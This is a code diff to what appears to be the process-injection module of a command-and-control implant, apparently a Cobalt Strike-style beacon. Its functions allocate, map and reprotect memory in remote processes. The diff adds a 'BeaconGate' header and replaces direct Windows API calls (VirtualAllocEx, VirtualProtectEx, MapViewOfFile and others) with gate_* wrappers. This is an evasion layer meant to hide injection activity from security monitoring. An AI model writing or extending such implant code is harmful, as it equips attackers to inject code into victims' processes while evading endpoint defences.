@@ -4,6 +4,7 @@
 #include <stdlib.h>
 #include <stdio.h>
 #include <windows.h>
+#include "beacon_gate.h" /* BeaconGate: gate_* = the API with the gate in front */
 #include "beacon.h"
 #include "commands.h"
 #include "parse.h"
@@ -47,7 +48,7 @@ char * remote_mirror_data_ntmapviewofsection(HANDLE hProcess, DWORD pid, char * 
 		goto done;
 
 	/* map it into the current process */
-	ctx_local = (char *)MapViewOfFile(hFile, FILE_MAP_ALL_ACCESS, 0, 0, 0);
+	ctx_local = (char *)gate_MapViewOfFile(hFile, FILE_MAP_ALL_ACCESS, 0, 0, 0);
 	if (ctx_local == NULL)
 		goto done;
 
@@ -60,10 +61,10 @@ char * remote_mirror_data_ntmapviewofsection(HANDLE hProcess, DWORD pid, char * 
 done:
 	/* clean up */
 	if (ctx_local != NULL)
-		UnmapViewOfFile(ctx_local);
+		gate_UnmapViewOfFile(ctx_local);
 
 	if (hFile != INVALID_HANDLE_VALUE)
-		CloseHandle(hFile);
+		gate_CloseHandle(hFile);
 
 	/* report failure if we indeed failed */
 	if (ctx_remote == NULL)
@@ -83,7 +84,7 @@ char * remote_mirror_data_virtualallocex(HANDLE hProcess, DWORD pid, char * buff
 		allocsz = length;
 
 	/* allocate memory in our process */
-	ptr = (char *)VirtualAllocEx(hProcess, 0, allocsz, MEM_RESERVE | MEM_COMMIT, setting_short(SETTING_PROCINJ_PERMS_I));
+	ptr = (char *)gate_VirtualAllocEx(hProcess, 0, allocsz, MEM_RESERVE | MEM_COMMIT, setting_short(SETTING_PROCINJ_PERMS_I));
 	if (ptr == NULL) {
 		post_error_dd(0x1f, allocsz, GetLastError());
 		return NULL;
@@ -125,7 +126,7 @@ char * remote_mirror_data_virtualallocex(HANDLE hProcess, DWORD pid, char * buff
 	if (setting_short(SETTING_PROCINJ_PERMS_I) == setting_short(SETTING_PROCINJ_PERMS)) {
 		/* do nothing... the perms are already where we want them. */
 	}
-	else if (!VirtualProtectEx(hProcess, ptr, allocsz, setting_short(SETTING_PROCINJ_PERMS), &old)) {
+	else if (!gate_VirtualProtectEx(hProcess, ptr, allocsz, setting_short(SETTING_PROCINJ_PERMS), &old)) {
 		post_error_d(0x11, GetLastError());
 		VirtualFreeEx(hProcess, ptr, 0, MEM_RELEASE);
 		return NULL;
@@ -144,7 +145,7 @@ char * local_mirror_data(char * buffer, int length) {
 
 	/* allocate memory in our process */
 	/* TODO: local_mirror_data caller is responsible for allocated memory */
-	ptr = (char *)VirtualAlloc(0, allocsz, MEM_RESERVE | MEM_COMMIT, setting_short(SETTING_PROCINJ_PERMS_I));
+	ptr = (char *)gate_VirtualAlloc(0, allocsz, MEM_RESERVE | MEM_COMMIT, setting_short(SETTING_PROCINJ_PERMS_I));
 	if (ptr == NULL) {
 		post_error_dd(0x1f, allocsz, GetLastError());
 		return NULL;
@@ -158,7 +159,7 @@ char * local_mirror_data(char * buffer, int length) {
 		return (char*)ptr;
 	}
 	else {
-		VirtualFree(ptr, 0, MEM_RELEASE);
+		gate_VirtualFree(ptr, 0, MEM_RELEASE);
 		return NULL;
 	}
 }
@@ -170,7 +171,7 @@ BOOL finalize_memory_permissions(char * ptr, SIZE_T length) {
 	if (setting_short(SETTING_PROCINJ_PERMS_I) == setting_short(SETTING_PROCINJ_PERMS)) {
 		return TRUE;
 	}
-	else if (!VirtualProtect(ptr, length, setting_short(SETTING_PROCINJ_PERMS), &old)) {
+	else if (!gate_VirtualProtect(ptr, length, setting_short(SETTING_PROCINJ_PERMS), &old)) {
 		post_error_d(0x11, GetLastError());
 		return FALSE;
 	}
